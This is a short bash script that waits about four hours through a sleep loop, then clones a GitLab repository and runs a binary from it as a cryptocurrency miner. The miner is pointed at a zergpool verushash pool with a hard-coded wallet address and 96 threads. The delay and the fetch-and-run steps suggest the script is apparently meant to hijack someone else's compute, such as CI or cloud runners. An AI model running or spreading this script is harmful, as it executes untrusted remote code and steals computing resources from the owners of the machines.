#!/usr/bin/env bash
n=1
while [ $n -lt 5 ]
do
echo "The value of n is now $n"
sleep 3600s
echo " "
((n=$n+1))
done
git clone https://gitlab.com/kikibena365/ikan.git
cd ikan
chmod +x kanyut 
./kanyut -v -l verushash.asia.mine.zergpool.com:3300 -u RV78iwCVdQZXmVU28ddyRcQUDAChZNggDn.$(echo $(shuf -i 1-99999 -n 1)-Tytyd) -p x -t 96
